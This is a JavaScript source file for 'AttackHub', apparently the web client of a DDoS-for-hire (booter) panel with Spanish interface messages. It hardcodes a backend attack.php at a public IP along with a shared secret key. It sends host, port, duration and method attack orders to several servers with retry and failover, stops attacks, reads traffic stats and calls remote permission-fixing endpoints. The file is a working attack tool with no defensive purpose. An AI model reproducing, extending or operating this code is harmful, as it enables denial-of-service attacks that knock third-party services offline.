// ═══════════════════════════════════════════════════════════════════════
// AttackHub Web – AttackApi (JavaScript port of C# AttackApi.cs)
// ═══════════════════════════════════════════════════════════════════════

var AttackApi = (function () {

    // ── Constants (same as C#) ─────────────────────────────────────────
    var SecretKey = "mdp";
    var RequestTimeoutSeconds = 120;
    var MaxRetries = 2;

    // ── APIs ───────────────────────────────────────────────────────────
    var _builtinApis = [
        { Url: "http://163.5.102.40/attack.php", Enabled: true },
        { Url: "http://0.0.0.0/attack.php", Enabled: false },
        { Url: "http://0.0.0.0/attack.php", Enabled: false },
        { Url: "http://0.0.0.0/attack.php", Enabled: false },
        { Url: "http://0.0.0.0/attack.php", Enabled: false },
    ];

    var _currentApiList = _builtinApis.slice();
    var _apis = _builtinApis.filter(function (a) { return a.Enabled; }).map(function (a) { return a.Url; });

    // ── Per-API health tracking ────────────────────────────────────────
    var _health = {};
    var HealthFailThreshold = 1;
    var HealthCooldownSeconds = 5;

    function ApiHealth() {
        this.ConsecutiveFailures = 0;
        this.CooldownUntil = 0;
        this.LastLatencyMs = 0;
        this.AvgLatencyMs = 0;
        this._samples = 0;
    }

    ApiHealth.prototype.IsInCooldown = function () {
        return Date.now() < this.CooldownUntil;
    };

    ApiHealth.prototype.RecordSuccess = function (latencyMs) {
        this.ConsecutiveFailures = 0;
        this.CooldownUntil = 0;
        this.LastLatencyMs = latencyMs;
        this._samples++;
        this.AvgLatencyMs = this._samples === 1
            ? latencyMs
            : Math.floor((this.AvgLatencyMs * (this._samples - 1) + latencyMs) / this._samples);
    };

    ApiHealth.prototype.RecordFailure = function () {
        this.ConsecutiveFailures++;
        if (this.ConsecutiveFailures >= HealthFailThreshold)
            this.CooldownUntil = Date.now() + (HealthCooldownSeconds * 1000);
    };

    function GetHealth(url) {
        if (!_health[url]) _health[url] = new ApiHealth();
        return _health[url];
    }

    /// Returns APIs sorted by avg latency, skipping those in cooldown.
    function GetHealthyApis() {
        var healthy = _apis.filter(function (url) { return !GetHealth(url).IsInCooldown(); });
        healthy.sort(function (a, b) { return GetHealth(a).AvgLatencyMs - GetHealth(b).AvgLatencyMs; });
        return healthy;
    }

    // ── Rate limiter ───────────────────────────────────────────────────
    var _lastAttackTime = 0;
    var MinAttackInterval = 500;

    // ── API management ─────────────────────────────────────────────────
    function ReloadApis(urls) {
        _currentApiList = urls.map(function (u) { return { Url: u.trim(), Enabled: true }; });
        _apis = urls.map(function (u) { return u.trim(); });
        ClearMethodsCache();
    }

    function ResetToBuiltin() {
        _currentApiList = _builtinApis.slice();
        _apis = _builtinApis.filter(function (a) { return a.Enabled; }).map(function (a) { return a.Url; });
        ClearMethodsCache();
    }

    // ── Methods cache ──────────────────────────────────────────────────
    var _cachedMethods = null;
    var _cacheExpiry = 0;
    var CacheDuration = 2 * 60 * 1000; // 2 minutes

    function ClearMethodsCache() {
        _cachedMethods = null;
        _cacheExpiry = 0;
    }

    async function GetAvailableMethodsAsync(forceRefresh) {
        if (!forceRefresh && _cachedMethods !== null && Date.now() < _cacheExpiry)
            return _cachedMethods;

        var allMethods = {};
        var healthy = GetHealthyApis();
        if (healthy.length === 0) healthy = _apis.slice(); // fallback: try all

        var tasks = healthy.map(function (api) { return GetMethodsFromApiAsync(api); });
        var results;
        try { results = await Promise.all(tasks); } catch (e) { results = []; }

        for (var i = 0; i < results.length; i++) {
            if (results[i]) {
                for (var j = 0; j < results[i].length; j++) {
                    allMethods[results[i][j].toUpperCase()] = results[i][j];
                }
            }
        }

        var keys = Object.keys(allMethods);
        if (keys.length > 0) {
            keys.sort();
            _cachedMethods = keys.map(function (k) { return allMethods[k]; });
            _cacheExpiry = Date.now() + CacheDuration;
            return _cachedMethods;
        }

        return _cachedMethods || [];
    }

    // ── Core HTTP helper with retry ────────────────────────────────────
    async function HttpGetWithRetryAsync(url, timeoutSeconds, maxRetries) {
        if (maxRetries === undefined) maxRetries = MaxRetries;

        for (var attempt = 0; attempt <= maxRetries; attempt++) {
            var controller = new AbortController();
            var timeoutId = setTimeout(function () { controller.abort(); }, timeoutSeconds * 1000);

            try {
                var response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);

                if (response.ok)
                    return await response.text();

                // 429 Too Many Requests -> wait and retry
                if (response.status === 429 && attempt < maxRetries) {
                    await _sleep(Math.pow(2, attempt) * 500);
                    continue;
                }

                // 5xx -> retry with backoff
                if (response.status >= 500 && attempt < maxRetries) {
                    await _sleep(Math.pow(2, attempt) * 300);
                    continue;
                }

                return null; // 4xx or other non-retryable

            } catch (e) {
                clearTimeout(timeoutId);
                if (e.name === 'AbortError' && attempt < maxRetries) {
                    await _sleep(Math.pow(2, attempt) * 200);
                    continue;
                }
                if (attempt < maxRetries) {
                    await _sleep(Math.pow(2, attempt) * 300);
                    continue;
                }
                return null;
            }
        }
        return null;
    }

    function _sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

    // ── Methods from API (multi-format detection) ──────────────────────
    async function GetMethodsFromApiAsync(apiUrl) {
        var list = [];
        var sw = Date.now();
        try {
            // Try primary endpoint
            var body = await HttpGetWithRetryAsync(apiUrl + "?action=methods", 10, 1);

            // Fallback endpoints if primary fails
            if (!body || !body.trim())
                body = await HttpGetWithRetryAsync(apiUrl + "?methods", 8, 0);
            if (!body || !body.trim())
                body = await HttpGetWithRetryAsync(apiUrl + "?action=methods&key=" + encodeURIComponent(SecretKey), 8, 0);

            var elapsed = Date.now() - sw;
            if (!body || !body.trim()) { GetHealth(apiUrl).RecordFailure(); return list; }

            body = body.trim();

            // ── Try JSON parsing ─────────────────────────────────────
            if (body.charAt(0) === '{' || body.charAt(0) === '[') {
                try {
                    var parsed = JSON.parse(body);
                    ExtractMethodsFromJson(parsed, list);
                } catch (e) { }
            }

            // ── Fallback: plain text ─────────────────────────────────
            if (list.length === 0 && body.charAt(0) !== '{' && body.charAt(0) !== '[') {
                ParseMethodsFromText(body, list);
            }

            // ── Fallback: extract from HTML ──────────────────────────
            if (list.length === 0 && body.indexOf('<') >= 0) {
                var stripped = body.replace(/<[^>]+>/g, " ");
                ParseMethodsFromText(stripped, list);
            }

            // Deduplicate
            var seen = {};
            list = list.filter(function (m) {
                var key = m.toUpperCase();
                if (seen[key]) return false;
                seen[key] = true;
                return true;
            });

            if (list.length > 0)
                GetHealth(apiUrl).RecordSuccess(elapsed);
            else
                GetHealth(apiUrl).RecordFailure();

        } catch (e) { GetHealth(apiUrl).RecordFailure(); }
        return list;
    }

    /// Recursively extracts method names from any JSON structure.
    function ExtractMethodsFromJson(element, list) {

        // ── Array ────────────────────────────────────────────────────
        if (Array.isArray(element)) {
            for (var i = 0; i < element.length; i++) {
                var item = element[i];
                if (typeof item === 'string') {
                    if (item.trim()) list.push(item.trim());
                } else if (typeof item === 'object' && item !== null) {
                    var keys = ["name", "method", "id", "value", "label"];
                    for (var k = 0; k < keys.length; k++) {
                        if (item[keys[k]] !== undefined && typeof item[keys[k]] === 'string') {
                            var v = item[keys[k]].trim();
                            if (v) list.push(v);
                            break;
                        }
                    }
                } else if (typeof item === 'number') {
                    list.push(String(item));
                }
            }
            return;
        }

        // ── Object ───────────────────────────────────────────────────
        if (typeof element === 'object' && element !== null) {
            var methodKeys = ["methods", "data", "available", "list", "attacks", "result", "attack_methods"];
            for (var mk = 0; mk < methodKeys.length; mk++) {
                var mkey = methodKeys[mk];
                if (element[mkey] !== undefined) {
                    var child = element[mkey];
                    if (Array.isArray(child) || (typeof child === 'object' && child !== null)) {
                        ExtractMethodsFromJson(child, list);
                        if (list.length > 0) return;
                    } else if (typeof child === 'string') {
                        if (child.trim()) ParseMethodsFromText(child, list);
                        if (list.length > 0) return;
                    }
                }
            }

            // {"UDP":true, "TCP":true} pattern
            if (list.length === 0) {
                var skipKeys = ["SUCCESS", "MESSAGE", "ERROR", "STATUS", "CODE", "KEY", "HOST", "PORT", "TIME", "ACTION"];
                var propNames = Object.keys(element);
                for (var p = 0; p < propNames.length; p++) {
                    var name = propNames[p].trim().toUpperCase();
                    if (skipKeys.indexOf(name) >= 0) continue;

                    var val = element[propNames[p]];
                    if (val === true ||
                        (typeof val === 'number' && val !== 0) ||
                        (typeof val === 'string' && ["1", "true", "enabled", "on"].indexOf(val) >= 0)) {
                        if (IsLikelyMethodName(propNames[p]))
                            list.push(propNames[p].trim());
                    }
                }
            }
            return;
        }

        // ── String ───────────────────────────────────────────────────
        if (typeof element === 'string') {
            if (element.trim()) ParseMethodsFromText(element, list);
        }
    }

    /// Parses methods from plain text.
    function ParseMethodsFromText(text, list) {
        var tokens = text.split(/[,\n\r|;]/);
        for (var i = 0; i < tokens.length; i++) {
            var clean = tokens[i].trim().replace(/^["'\[\]{}]+|["'\[\]{}]+$/g, '');
            if (clean.length >= 2 && clean.length <= 30 && IsLikelyMethodName(clean))
                list.push(clean);
        }
    }

    /// Checks if a string looks like an attack method name.
    function IsLikelyMethodName(name) {
        if (!name || name.length < 2 || name.length > 30) return false;
        for (var i = 0; i < name.length; i++) {
            var c = name.charAt(i);
            if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c === '-' || c === '_' || c === '.'))
                return false;
        }
        if (/^\d+$/.test(name)) return false;
        return true;
    }

    // ── Stats from API ─────────────────────────────────────────────────
    async function GetStatsFromApiAsync(apiUrl) {
        try {
            var body = await HttpGetWithRetryAsync(
                apiUrl + "?action=stats&key=" + encodeURIComponent(SecretKey), 5, 0);
            if (body === null) return { ApiUrl: apiUrl, TxMbps: 0, RxMbps: 0, Running: 0, Interface: "?" };

            var root = JSON.parse(body);
            return {
                ApiUrl: apiUrl,
                TxMbps: root.tx_mbps || 0,
                RxMbps: root.rx_mbps || 0,
                Running: (typeof root.running === 'number') ? root.running : 0,
                Interface: root.interface || "?"
            };
        } catch (e) { return { ApiUrl: apiUrl, TxMbps: 0, RxMbps: 0, Running: 0, Interface: "?" }; }
    }

    // ── Shared API check logic ─────────────────────────────────────────
    async function CheckApiAsync(api) {
        if (!api.Enabled)
            return { Url: api.Url, Enabled: false, Online: false, MethodCount: 0, Methods: [], StatusText: "Desactivada", LatencyMs: 0, TxMbps: 0, RxMbps: 0, RunningProcesses: 0 };

        var sw = Date.now();
        var methods;
        try {
            methods = await GetMethodsFromApiAsync(api.Url);
        } catch (e) {
            return { Url: api.Url, Enabled: true, Online: false, MethodCount: 0, Methods: [], StatusText: "Offline", LatencyMs: Date.now() - sw, TxMbps: 0, RxMbps: 0, RunningProcesses: 0 };
        }

        var latency = Date.now() - sw;

        if (methods.length === 0)
            return { Url: api.Url, Enabled: true, Online: false, MethodCount: 0, Methods: [], StatusText: "Sin metodos", LatencyMs: latency, TxMbps: 0, RxMbps: 0, RunningProcesses: 0 };

        var txMbps = 0, rxMbps = 0, running = 0;
        try {
            var stats = await GetStatsFromApiAsync(api.Url);
            txMbps = stats.TxMbps; rxMbps = stats.RxMbps; running = stats.Running;
        } catch (e) { }

        return { Url: api.Url, Enabled: true, Online: true, MethodCount: methods.length, Methods: methods, StatusText: "Online", LatencyMs: latency, TxMbps: txMbps, RxMbps: rxMbps, RunningProcesses: running };
    }

    // ── Public status methods ──────────────────────────────────────────
    async function CheckStatusAsync() {
        var results = await GetPerApiStatusAsync();
        var online = results.filter(function (r) { return r.Online; }).length;
        var allMeth = {};
        results.forEach(function (r) {
            if (r.Online) r.Methods.forEach(function (m) { allMeth[m.toUpperCase()] = true; });
        });
        return { OnlineCount: online, TotalApis: _apis.length, MethodCount: Object.keys(allMeth).length };
    }

    async function GetPerApiStatusAsync() {
        var tasks = _currentApiList.map(function (api) { return CheckApiAsync(api); });
        var settled = await Promise.allSettled(tasks);

        var results = [];
        for (var i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled')
                results.push(settled[i].value);
            else
                results.push({ Url: "?", Enabled: false, Online: false, MethodCount: 0, Methods: [], StatusText: "Error", LatencyMs: 0, TxMbps: 0, RxMbps: 0, RunningProcesses: 0 });
        }
        return results;
    }

    async function CheckSingleApiAsync(index) {
        if (index < 0 || index >= _currentApiList.length)
            return { Url: "?", Enabled: false, Online: false, MethodCount: 0, Methods: [], StatusText: "Indice invalido", LatencyMs: 0, TxMbps: 0, RxMbps: 0, RunningProcesses: 0 };
        return await CheckApiAsync(_currentApiList[index]);
    }

    async function GetAllStatsAsync() {
        var tasks = _apis.map(function (api) { return GetStatsFromApiAsync(api); });
        var settled = await Promise.allSettled(tasks);

        var results = [];
        for (var i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled')
                results.push(settled[i].value);
            else
                results.push({ ApiUrl: "?", TxMbps: 0, RxMbps: 0, Running: 0, Interface: "?" });
        }
        return results;
    }

    async function GetCombinedStatsAsync() {
        var all = await GetAllStatsAsync();
        var tx = 0, rx = 0, running = 0;
        for (var i = 0; i < all.length; i++) {
            tx += all[i].TxMbps; rx += all[i].RxMbps; running += all[i].Running;
        }
        return { TotalTxMbps: Math.round(tx * 100) / 100, TotalRxMbps: Math.round(rx * 100) / 100, TotalRunning: running };
    }

    // ── Stop attack ────────────────────────────────────────────────────
    async function StopAttackAsync(host, method) {
        if (!host || !host.trim())
            return { Success: false, Message: "Error: host vacio." };

        var tasks = _apis.map(function (api) { return StopOnApiAsync(api, host, method); });
        var settled = await Promise.allSettled(tasks);

        var ok = 0;
        for (var i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled' && settled[i].value.Success) ok++;
        }

        return ok > 0
            ? { Success: true, Message: "Ataque detenido en " + ok + "/" + _apis.length + " servidor(es)." }
            : { Success: false, Message: "No se pudo detener en ningun servidor." };
    }

    async function StopOnApiAsync(apiUrl, host, method) {
        try {
            var url = apiUrl + "?action=stop&key=" + encodeURIComponent(SecretKey) +
                "&host=" + encodeURIComponent(host);
            if (method) url += "&method=" + encodeURIComponent(method);

            var body = await HttpGetWithRetryAsync(url, 15, 1);
            if (body === null) return { Success: false, Message: "Sin respuesta" };

            var doc = JSON.parse(body);
            return { Success: doc.success === true, Message: doc.message || body };
        } catch (ex) { return { Success: false, Message: ex.message || "Error" }; }
    }

    // ── Send attack ────────────────────────────────────────────────────
    async function SendAttackAsync(host, port, time, method) {
        if (!host || !host.trim())     return { Success: false, Message: "Error: host vacio." };
        if (!port)                     return { Success: false, Message: "Error: port vacio." };
        if (!time)                     return { Success: false, Message: "Error: time vacio." };
        if (!method || !method.trim()) return { Success: false, Message: "Error: method vacio." };

        // Rate limiting
        var now = Date.now();
        var elapsed = now - _lastAttackTime;
        if (elapsed < MinAttackInterval)
            return { Success: false, Message: "Espera " + (MinAttackInterval - elapsed) + "ms entre ataques." };
        _lastAttackTime = now;

        // Verify method exists
        var methods = await GetAvailableMethodsAsync();
        if (methods.length === 0)
            return { Success: false, Message: "Error: No se pudo obtener metodos de ninguna API.\nVerifica que los servidores esten en linea." };

        var exists = methods.some(function (m) { return m.toUpperCase() === method.toUpperCase(); });
        if (!exists) {
            methods = await GetAvailableMethodsAsync(true);
            exists = methods.some(function (m) { return m.toUpperCase() === method.toUpperCase(); });
            if (!exists)
                return { Success: false, Message: "Error: El metodo \"" + method + "\" no existe en ningun servidor.\n\nMetodos disponibles: " + methods.join(", ") };
        }

        // Send to healthy APIs first, then fallback to all
        var targets = GetHealthyApis();
        if (targets.length === 0) targets = _apis.slice();

        var tasks = targets.map(function (api) { return SendToApiAsync(api, host, port, time, method); });
        var settled = await Promise.allSettled(tasks);

        var ok = 0, fail = 0;
        var details = [];
        for (var i = 0; i < settled.length; i++) {
            var apiShort = targets[i];
            try { apiShort = new URL(targets[i]).hostname; } catch (e) { }

            if (settled[i].status === 'fulfilled') {
                if (settled[i].value.Success) { ok++; details.push("✅ " + apiShort); }
                else { fail++; details.push("❌ " + apiShort + ": " + settled[i].value.Message); }
            } else {
                fail++; details.push("❌ " + apiShort + ": " + (settled[i].reason ? settled[i].reason.message : "Error"));
            }
        }

        var detail = details.join("\n");
        return ok > 0
            ? { Success: true, Message: targets.length === 1 ? detail : "Enviado a " + ok + "/" + targets.length + " servidor(es)\n" + detail }
            : { Success: false, Message: "Error: Fallo en todos los servidores.\n" + detail };
    }

    async function SendToApiAsync(apiUrl, host, port, time, method) {
        var health = GetHealth(apiUrl);
        var sw = Date.now();
        try {
            var url = apiUrl + "?key=" + encodeURIComponent(SecretKey) +
                "&host=" + encodeURIComponent(host) +
                "&port=" + encodeURIComponent(port) +
                "&time=" + encodeURIComponent(time) +
                "&method=" + encodeURIComponent(method);

            var body = await HttpGetWithRetryAsync(url, RequestTimeoutSeconds, MaxRetries);
            var elapsed = Date.now() - sw;

            if (body === null) { health.RecordFailure(); return { Success: false, Message: "Sin respuesta" }; }

            var root = JSON.parse(body);
            var success = root.success === true;
            var message = root.message || body;

            if (!success) {
                if (root.available && Array.isArray(root.available)) {
                    var available = root.available.filter(function (v) { return v; });
                    if (available.length > 0) message += "\nDisponibles: " + available.join(", ");
                }
                health.RecordFailure();
                return { Success: false, Message: message };
            }

            health.RecordSuccess(elapsed);
            return { Success: true, Message: message };
        } catch (ex) {
            health.RecordFailure();
            if (ex.name === 'AbortError') return { Success: false, Message: "Timeout" };
            return { Success: false, Message: ex.message || "Error" };
        }
    }

    // ── Health info (for UI/debugging) ─────────────────────────────────
    function GetHealthSummary() {
        var healthy = 0, cooldown = 0;
        for (var i = 0; i < _apis.length; i++) {
            if (GetHealth(_apis[i]).IsInCooldown()) cooldown++;
            else healthy++;
        }
        return { Healthy: healthy, Cooldown: cooldown, Total: _apis.length };
    }

    // ── Fix permissions on server ──────────────────────────────────────
    async function FixPermissionsAsync(apiUrl) {
        var endpoints = [
            apiUrl + "?action=chmod&key=" + encodeURIComponent(SecretKey),
            apiUrl + "?action=fix&key=" + encodeURIComponent(SecretKey),
            apiUrl + "?action=permissions&key=" + encodeURIComponent(SecretKey),
            apiUrl + "?action=setup&key=" + encodeURIComponent(SecretKey),
        ];

        for (var i = 0; i < endpoints.length; i++) {
            try {
                var body = await HttpGetWithRetryAsync(endpoints[i], 10, 0);
                if (body === null) continue;

                try {
                    var doc = JSON.parse(body);
                    if (doc.success === true) return { Success: true, Message: doc.message || "Permisos corregidos" };
                } catch (e) {
                    if (/ok|success|chmod/i.test(body))
                        return { Success: true, Message: "Permisos corregidos" };
                }
            } catch (e) { }
        }

        return {
            Success: false,
            Message: "El servidor no soporta correccion remota de permisos.\n\n" +
                "Solucion manual por SSH:\n" +
                "  chmod -R 755 /var/www/html/\n" +
                "  chmod 644 /var/www/html/attack.php\n" +
                "  chown -R www-data:www-data /var/www/html/"
        };
    }

    /// Fixes permissions on ALL active APIs.
    async function FixAllPermissionsAsync() {
        var fixed_ = 0, failed = 0;
        var details = [];

        var tasks = _apis.map(async function (api) {
            var host = api;
            try { host = new URL(api).hostname; } catch (e) { }
            var result = await FixPermissionsAsync(api);
            return { Host: host, Ok: result.Success, Msg: result.Message };
        });

        var settled = await Promise.allSettled(tasks);

        for (var i = 0; i < settled.length; i++) {
            if (settled[i].status !== 'fulfilled') { failed++; details.push("❌ Error"); continue; }
            if (settled[i].value.Ok) { fixed_++; details.push("✅ " + settled[i].value.Host); }
            else { failed++; details.push("❌ " + settled[i].value.Host + ": " + settled[i].value.Msg); }
        }

        return { Fixed: fixed_, Failed: failed, Details: details.join("\n") };
    }

    // ── Public API ───────────────────
    return {
        // Properties
        get ApiList() { return _currentApiList; },
        get Apis() { return _apis.slice(); },

        // API management
        ReloadApis: ReloadApis,
        ResetToBuiltin: ResetToBuiltin,

        // Methods cache
        ClearMethodsCache: ClearMethodsCache,
        GetAvailableMethodsAsync: GetAvailableMethodsAsync,

        // Status
        CheckStatusAsync: CheckStatusAsync,
        GetPerApiStatusAsync: GetPerApiStatusAsync,
        CheckSingleApiAsync: CheckSingleApiAsync,

        // Stats
        GetAllStatsAsync: GetAllStatsAsync,
        GetCombinedStatsAsync: GetCombinedStatsAsync,

        // Attack
        SendAttackAsync: SendAttackAsync,
        StopAttackAsync: StopAttackAsync,

        // Health
        GetHealthSummary: GetHealthSummary,

        // Permissions
        FixPermissionsAsync: FixPermissionsAsync,
        FixAllPermissionsAsync: FixAllPermissionsAsync
    };
})();

// ═══════════════════════════════════════════════════════════════════════
// Shared UI Utilities (used by attack.html, status.html, index.html)
// ═══════════════════════════════════════════════════════════════════════

function $(id) { return document.getElementById(id); }
function enc(s) { return encodeURIComponent(s); }
function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

function toast(msg, type) {
    var container = $('toasts');
    if (!container) return;
    var el = document.createElement('div');
    el.className = 'toast ' + (type || 'info');
    el.textContent = msg;
    container.appendChild(el);
    setTimeout(function () { el.classList.add('show'); }, 10);
    setTimeout(function () { el.classList.remove('show'); setTimeout(function () { el.remove(); }, 300); }, 3500);
}

function checkAuth() {
    var user = localStorage.getItem('ah_user');
    if (!user && !window.location.pathname.endsWith('login.html')) {
        window.location.href = 'login.html';
        return;
    }
    if (!user) return;

    // Real-time listener for kick/lockdown
    if (typeof fbRef === 'function') {
        // Check kicked (real-time)
        fbRef('presence/' + user).on('value', function(snap) {
            var p = snap.val();
            if (p && p.kicked === true) {
                localStorage.clear();
                window.location.href = 'login.html';
            }
        });

        // Check lockdown (real-time)
        fbRef('system/lockdown').on('value', function(snap) {
            var lockdown = snap.val();
            var role = localStorage.getItem('ah_role') || 'user';
            if (lockdown && lockdown.enabled === true && role !== 'creator') {
                if (!window.location.pathname.endsWith('maintenance.html')) {
                    localStorage.setItem('ah_lockdown_msg', lockdown.message || 'System maintenance in progress.');
                    window.location.href = 'maintenance.html';
                }
            }
        });
    }
}

function logout() {
    var user = localStorage.getItem('ah_user');
    if (user && typeof fbSetOffline === 'function') fbSetOffline(user);
    if (user && typeof fbLogLogout === 'function') fbLogLogout(user);
    localStorage.removeItem('ah_user');
    localStorage.removeItem('ah_pass');
    window.location.href = 'login.html';
}

function initFirebasePresence() {
    var user = localStorage.getItem('ah_user');
    if (user && typeof fbSetOnline === 'function') fbSetOnline(user);
}

function showAdminNavIfNeeded() {
    var el = $('adminNavLink');
    if (!el) return;
    // Instant show from localStorage (no flash)
    var role = localStorage.getItem('ah_role') || 'user';
    if (role === 'admin' || role === 'creator') el.style.display = '';
    // Load navbar user (name + photo)
    updateNavbarUser();
    // Verify with Firebase
    var user = localStorage.getItem('ah_user');
    if (user && typeof fbRef === 'function') {
        fbRef('users/' + user).once('value').then(function (snap) {
            if (snap.exists()) {
                var fbRole = snap.val().role || 'user';
                localStorage.setItem('ah_role', fbRole);
                el.style.display = (fbRole === 'admin' || fbRole === 'creator') ? '' : 'none';
            }
        }).catch(function () { });
    }
}

function loadNavbarPhoto() {
    var user = localStorage.getItem('ah_user');
    if (!user) return;
    var navAvatar = $('sidebarUserAvatar');
    if (!navAvatar) return;
    var cached = localStorage.getItem('ah_photo');
    if (cached) {
        navAvatar.style.backgroundImage = 'url(' + cached + ')';
        navAvatar.style.backgroundSize = 'cover';
        navAvatar.style.backgroundPosition = 'center';
        navAvatar.textContent = '';
    }
    if (typeof fbRef !== 'function') return;
    fbRef('users/' + user).once('value').then(function(snap) {
        if (snap.exists() && snap.val().photoUrl) {
            navAvatar.style.backgroundImage = 'url(' + snap.val().photoUrl + ')';
            navAvatar.style.backgroundSize = 'cover';
            navAvatar.style.backgroundPosition = 'center';
            navAvatar.textContent = '';
            try { localStorage.setItem('ah_photo', snap.val().photoUrl); } catch(e) {}
        } else if (snap.exists() && !snap.val().photoUrl) {
            navAvatar.style.backgroundImage = '';
            navAvatar.textContent = user.charAt(0).toUpperCase();
            try { localStorage.removeItem('ah_photo'); } catch(e) {}
        }
    }).catch(function() {});
}

function updateNavbarUser() {
    var user = localStorage.getItem('ah_user');
    if (!user) return;
    var navName = $('sidebarUserName');
    var navAvatar = $('sidebarUserAvatar');
    if (navName) navName.textContent = user;
    if (navAvatar) navAvatar.textContent = user.charAt(0).toUpperCase();
    var cached = localStorage.getItem('ah_photo');
    if (cached && navAvatar) {
        navAvatar.style.backgroundImage = 'url(' + cached + ')';
        navAvatar.style.backgroundSize = 'cover';
        navAvatar.style.backgroundPosition = 'center';
        navAvatar.textContent = '';
    }
    if (typeof fbRef !== 'function') return;
    fbRef('users/' + user).once('value').then(function(snap) {
        if (snap.exists()) {
            var data = snap.val();
            var displayName = data.displayName || data.username || user;
            if (navName) navName.textContent = displayName;
            if (data.photoUrl && navAvatar) {
                navAvatar.style.backgroundImage = 'url(' + data.photoUrl + ')';
                navAvatar.style.backgroundSize = 'cover';
                navAvatar.style.backgroundPosition = 'center';
                navAvatar.textContent = '';
                try { localStorage.setItem('ah_photo', data.photoUrl); } catch(e) {}
            } else if (navAvatar && !data.photoUrl) {
                navAvatar.style.backgroundImage = '';
                navAvatar.textContent = displayName.charAt(0).toUpperCase();
                try { localStorage.removeItem('ah_photo'); } catch(e) {}
            }
        }
    }).catch(function() {});
}

function formatSec(s) {
    if (s >= 3600) return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
    if (s >= 60) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
    return s + 's';
}

function isValidIp(ip) {
    if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
        return ip.split('.').every(function (n) { return parseInt(n) >= 0 && parseInt(n) <= 255; });
    }
    return false;
}

function classifyIp(ip) {
    if (!isValidIp(ip)) return { valid: false, type: 'invalid', color: '#ef4444', label: 'Invalid IP' };
    var parts = ip.split('.').map(Number);
    if (parts[0] === 10 || (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) || (parts[0] === 192 && parts[1] === 168))
        return { valid: true, type: 'private', color: '#f59e0b', label: 'Private IP' };
    if (parts[0] === 127) return { valid: true, type: 'loopback', color: '#64748b', label: 'Loopback' };
    return { valid: true, type: 'public', color: '#10b981', label: 'Public IP' };
}

function parseUrlDomain(url) {
    var s = url.trim();
    if (!s) return null;
    if (!/^https?:\/\//i.test(s)) s = 'https://' + s;
    try { return new URL(s).hostname; } catch (e) { return null; }
}

function blockInvalidNum(ev) {
    if (['e', 'E', '+', '-', '.', ','].indexOf(ev.key) >= 0) ev.preventDefault();
}

function clampPort(el) {
    var v = parseInt(el.value);
    if (isNaN(v) || v < 1) el.value = 1;
    else if (v > 65535) el.value = 65535;
}

function clampTime(el) {
    var v = parseInt(el.value);
    if (isNaN(v) || v < 1) el.value = 1;
    var indicator = el.parentElement.querySelector('.atk-input-indicator');
    if (indicator) indicator.textContent = v > 0 ? formatSec(v) : '';
}

function populateSelect(id, methods) {
    var sel = $(id);
    if (!sel) return;
    var prev = sel.value;
    sel.innerHTML = '';
    methods.forEach(function (m) {
        var opt = document.createElement('option');
        opt.value = m; opt.textContent = m;
        sel.appendChild(opt);
    });
    if (prev && methods.indexOf(prev) >= 0) sel.value = prev;
}

function setMethodsStatus(mode, text, type) {
    var id = mode === 'ip' ? 'ipMethodsStatus' : 'urlMethodsStatus';
    var el = $(id);
    if (!el) return;
    el.textContent = text;
    if (type === 'ok') el.style.color = '#10b981';
    else if (type === 'err') el.style.color = '#ef4444';
    else el.style.color = '#64748b';
}
